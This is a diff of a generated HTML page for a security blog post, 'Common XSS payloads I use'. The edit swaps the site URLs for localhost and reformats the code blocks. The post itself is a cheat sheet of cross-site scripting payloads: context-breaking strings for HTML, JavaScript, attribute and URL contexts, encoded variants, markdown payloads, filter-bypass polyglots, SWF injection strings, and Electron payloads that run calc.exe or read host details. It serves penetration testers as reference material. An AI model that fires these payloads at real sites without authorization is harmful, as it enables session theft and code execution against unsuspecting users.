@@ -42,11 +42,11 @@
   
   <!-- Facebook OGP cards -->
   <meta property="og:description" content="Common XSS Tricks I use" />
-  <meta property="og:url" content="http://snoopysecurity.github.io" />
+  <meta property="og:url" content="http://localhost:4000" />
   <meta property="og:site_name" content="💻 | Blog" />
   <meta property="og:title" content="Common XSS payloads I use" />
   <meta property="og:type" content="website" />
-  <meta property="og:image" content="http://snoopysecurity.github.io/assets/logo.png" />
+  <meta property="og:image" content="http://localhost:4000/assets/logo.png" />
   <meta property="og:image:type" content="image/png" />
   <meta property="og:image:width" content="612" />
   <meta property="og:image:height" content="605" />
@@ -57,16 +57,16 @@
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="Common XSS payloads I use">
   <meta name="twitter:description" content="Common XSS Tricks I use">
-  <meta name="twitter:image" content="http://snoopysecurity.github.io/assets/logo.png">
-  <meta name="twitter:url" content="http://snoopysecurity.github.io">
+  <meta name="twitter:image" content="http://localhost:4000/assets/logo.png">
+  <meta name="twitter:url" content="http://localhost:4000">
   
 
   
 
   <!-- Site styles -->
   <link rel="stylesheet" href="/css/main.css">
-  <link rel="canonical" href="http://snoopysecurity.github.io/web-application-security/2019/08/02/08_common_xss_payloads_i_use.html">
-  <link rel="alternate" type="application/rss+xml" title="💻 | Blog" href="http://snoopysecurity.github.io/feed.xml" />
+  <link rel="canonical" href="http://localhost:4000/web-application-security/2019/08/02/08_common_xss_payloads_i_use.html">
+  <link rel="alternate" type="application/rss+xml" title="💻 | Blog" href="http://localhost:4000/feed.xml" />
 </head>
 
 
@@ -155,11 +155,10 @@
 
 <p>I usually use the following payloads from probing/detection:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>&lt;iframe/onload=prompt(1)&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;iframe/onload=prompt(1)&gt;
 &lt;img src=1 onerror=confirm(1)&gt;
 &lt;snoopy contenteditable id=x onfocus=prompt()&gt;
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="context-breaking">Context Breaking</h3>
 
@@ -167,30 +166,28 @@
   <li>HTML Context</li>
 </ul>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>&lt;a href="javaScriPt:alert(1)"&gt;CLICKHERE&lt;/a&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;a href="javaScriPt:alert(1)"&gt;CLICKHERE&lt;/a&gt;
 &lt;svg/onload=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(1)&gt;
 &lt;details/open/ontoggle="alert(1)"/&gt;
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <ul>
   <li>JavaScript Context</li>
 </ul>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>);alert(1);//
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>);alert(1);//
 '-confirm(1)-' 
 '-confirm`1`-'
 ');confirm(1);
 ');confirm(1);// 
 '-confirm(1)-'
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <ul>
   <li>Attribute Context</li>
 </ul>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>value="" onmouseover="alert('XSS')"&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>value="" onmouseover="alert('XSS')"&gt;
 value=#000000r93kponfocus=alert(1)autofocus=r93kp
 color-input=%23000000 onmouseover=alert(1)  
 ?q=&lt;body style=overflow:auto;height:1000px onscroll=alert(1337) id=x&gt;#x 
@@ -200,78 +197,70 @@ num=' onerror=alert(1) alt='
  "onload="javascript:alert(1)
  " onload="alert(1)
  "onmouseover="confirm(1)//
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <ul>
   <li>URL Context</li>
 </ul>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>data:text/html;base64,PHNjcmlwdD5hbGVydCgnWmVwaHJGaXNoJyk8L3NjcmlwdD4=
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>data:text/html;base64,PHNjcmlwdD5hbGVydCgnWmVwaHJGaXNoJyk8L3NjcmlwdD4=
 data://text/javascript/alert(1)
 /onafterscriptexecute=confirm(1)1='
 #onafterscriptexecute=confirm(1)1=' 
 data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="encodings">Encodings</h3>
 
 <p><a href="https://www.urlencoder.org/">URI Encoding</a></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>&lt;a href="javascript:alert%281%29"&gt;xss&lt;/a&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;a href="javascript:alert%281%29"&gt;xss&lt;/a&gt;
 &lt;iframe src="javascript:%61%6c%65%72%74%28%31%29"/&gt;
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p><a href="https://mothereff.in/html-entities">HTML Entities</a></p>
-<div class="highlighter-rouge"><pre class="highlight"><code>&lt;img src=x onerror=&amp;#x22;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x22;&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;img src=x onerror=&amp;#x22;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x22;&gt;
 &lt;a href="javascript:alert&amp;#x28;1&amp;#x29"&gt;xss&lt;/a&gt;
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="markdown-xss-payloads-i-commonly-use">Markdown XSS Payloads I commonly use</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>[ClickMe](javascript:prompt(window.location.pathname))
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[ClickMe](javascript:prompt(window.location.pathname))
 [ClickME](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
 ![ClickME](https://www.example.com/image.png"onload="alert(1))
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>Other common things I try:</p>
 
 <ul>
-  <li>Case Sensitive: <code class="highlighter-rouge">&lt;Iframe Src="//snoopysecurity" OnlOad="alert(0)"/&gt;</code></li>
-  <li>Arbritary Tags <code class="highlighter-rouge">&lt;snoopy onmouseover="alert(1)"&gt;Test&lt;/snoopy&gt;</code></li>
-  <li>Insert with no closing tags: <code class="highlighter-rouge">&lt;img src="x" onerror="alert(1)"</code> (Browsers will happily execute this)</li>
-  <li>Add forward slashes or whitespace e.g. <code class="highlighter-rouge">svg onload</code> or <code class="highlighter-rouge">svg/onload</code></li>
+  <li>Case Sensitive: <code class="language-plaintext highlighter-rouge">&lt;Iframe Src="//snoopysecurity" OnlOad="alert(0)"/&gt;</code></li>
+  <li>Arbritary Tags <code class="language-plaintext highlighter-rouge">&lt;snoopy onmouseover="alert(1)"&gt;Test&lt;/snoopy&gt;</code></li>
+  <li>Insert with no closing tags: <code class="language-plaintext highlighter-rouge">&lt;img src="x" onerror="alert(1)"</code> (Browsers will happily execute this)</li>
+  <li>Add forward slashes or whitespace e.g. <code class="language-plaintext highlighter-rouge">svg onload</code> or <code class="language-plaintext highlighter-rouge">svg/onload</code></li>
 </ul>
 
 <h3 id="polyglot-taken-from-httpsgithubcom0xsobkyhackvaultwikiunleashing-an-ultimate-xss-polyglot">Polyglot (Taken from https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e
-</code></pre>
-</div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e
+</code></pre></div></div>
 
 <p>Multi-context, filter bypass based polyglot payload #1 (Rsnake XSS Cheat Sheet)</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code> ';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- &gt;&lt;/SCRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83)) &lt;/SCRIPT&gt; 
-</code></pre>
-</div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- &gt;&lt;/SCRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83)) &lt;/SCRIPT&gt; 
+</code></pre></div></div>
 
 <p>Multi-context, filter bypass based polyglot payload #2 (Ashar Javed XSS Research)</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code> "&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;" &gt;&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1) &gt;&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;'--&gt;" &gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;img/id="confirm&amp;lpar; 1)"/alt="/"src="/"onerror=eval(id&amp;%23x29;&gt;'"&gt;&lt;img src="http: //i.imgur.com/P8mL8.jpg"&gt;
-</code></pre>
-</div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> "&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;" &gt;&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1) &gt;&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;'--&gt;" &gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;img/id="confirm&amp;lpar; 1)"/alt="/"src="/"onerror=eval(id&amp;%23x29;&gt;'"&gt;&lt;img src="http: //i.imgur.com/P8mL8.jpg"&gt;
+</code></pre></div></div>
 
 <h3 id="swf-parameter-xss">SWF Parameter XSS</h3>
 
 <p>For automation, you can use Flashbang, Flare or HP SWFScan.</p>
 
 <ul>
-  <li>Common Parameters: <code class="highlighter-rouge">onload</code>, <code class="highlighter-rouge">allowedDomain</code>, <code class="highlighter-rouge">movieplayer</code>, <code class="highlighter-rouge">xmlPath</code>, <code class="highlighter-rouge">eventhandler</code>, <code class="highlighter-rouge">callback</code> (more on OWASP page)</li>
-  <li>Common Injection Strings: ` \%22})))}catch(e){alert(document.domain);}//<code class="highlighter-rouge">,  </code>”]);}catch(e){}if(!self.a)self.a=!alert(document.domain);//<code class="highlighter-rouge">,</code>“a”)(({type:”ready”}));}catch(e){alert(1)}//`</li>
+  <li>Common Parameters: <code class="language-plaintext highlighter-rouge">onload</code>, <code class="language-plaintext highlighter-rouge">allowedDomain</code>, <code class="language-plaintext highlighter-rouge">movieplayer</code>, <code class="language-plaintext highlighter-rouge">xmlPath</code>, <code class="language-plaintext highlighter-rouge">eventhandler</code>, <code class="language-plaintext highlighter-rouge">callback</code> (more on OWASP page)</li>
+  <li>Common Injection Strings: ` \%22})))}catch(e){alert(document.domain);}//<code class="language-plaintext highlighter-rouge">,  </code>”]);}catch(e){}if(!self.a)self.a=!alert(document.domain);//<code class="language-plaintext highlighter-rouge">,</code>“a”)(({type:”ready”}));}catch(e){alert(1)}//`</li>
 </ul>
 
 <p>Following resources are great reference guides:</p>
@@ -286,12 +275,11 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 
 <h3 id="electron">Electron</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>&lt;iframe src=x onload="require('electron').shell.openExternal('C:/Windows/System32/calc.exe')"&gt;&lt;/iframe&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;iframe src=x onload="require('electron').shell.openExternal('C:/Windows/System32/calc.exe')"&gt;&lt;/iframe&gt;
 "&gt;&lt;img src=1 onerror="var os = require('os'); var hostname = os.platform(); var homedir = os.homedir(); alert('Host:' + hostname + 'directory: ' + homedir);"&gt;
 &lt;onmouseover="alert(1)"&gt; &lt;s onmouseover="var os = require('os'); var hostname = os.platform(); var homedir = os.homedir(); alert('Host:' + hostname + 'directory: ' + homedir);"&gt;Hallo&lt;/s&gt;
 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 </article>
 
@@ -308,7 +296,7 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
   
     
     
-      <a href="//twitter.com/share?text=Common+XSS+payloads+I+use&url=http%3A%2F%2Fsnoopysecurity.github.io%2Fweb-application-security%2F2019%2F08%2F02%2F08_common_xss_payloads_i_use.html&via=snoopysecurity"
+      <a href="//twitter.com/share?text=Common+XSS+payloads+I+use&url=http%3A%2F%2Flocalhost%3A4000%2Fweb-application-security%2F2019%2F08%2F02%2F08_common_xss_payloads_i_use.html&via=snoopysecurity"
         onclick="window.open(this.href, 'twitter-share', 'width=550,height=255');return false;">
         <i class="fa fa-twitter-square fa-lg"></i>
       </a>
@@ -323,7 +311,7 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
     
     
     
-      <a href="//www.facebook.com/sharer.php?t=Common+XSS+payloads+I+use&u=http%3A%2F%2Fsnoopysecurity.github.io%2Fweb-application-security%2F2019%2F08%2F02%2F08_common_xss_payloads_i_use.html"
+      <a href="//www.facebook.com/sharer.php?t=Common+XSS+payloads+I+use&u=http%3A%2F%2Flocalhost%3A4000%2Fweb-application-security%2F2019%2F08%2F02%2F08_common_xss_payloads_i_use.html"
         onclick="window.open(this.href, 'facebook-share', 'width=550,height=255');return false;">
         <i class="fa fa-facebook-square fa-lg"></i>
       </a>
@@ -348,7 +336,7 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
     
     
     
-      <a href="//www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Fsnoopysecurity.github.io%2Fweb-application-security%2F2019%2F08%2F02%2F08_common_xss_payloads_i_use.html"
+      <a href="//www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fweb-application-security%2F2019%2F08%2F02%2F08_common_xss_payloads_i_use.html"
         onclick="window.open(this.href, 'linkedin-share', 'width=550,height=255');return false;">
         <i class="fa fa-linkedin-square fa-lg"></i>
       </a>
@@ -390,7 +378,7 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
     
     
     
-      <a href="//www.pinterest.com/pin/create/button/?description=Common+XSS+payloads+I+use&url=http%3A%2F%2Fsnoopysecurity.github.io%2Fweb-application-security%2F2019%2F08%2F02%2F08_common_xss_payloads_i_use.html&media=http://snoopysecurity.github.io/assets/header_img.jpg"
+      <a href="//www.pinterest.com/pin/create/button/?description=Common+XSS+payloads+I+use&url=http%3A%2F%2Flocalhost%3A4000%2Fweb-application-security%2F2019%2F08%2F02%2F08_common_xss_payloads_i_use.html&media=http://localhost:4000/assets/header_img.jpg"
         onclick="window.open(this.href, 'pinterest-share', 'width=550,height=255');return false;">
         <i class="fa fa-pinterest-square fa-lg"></i>
       </a>
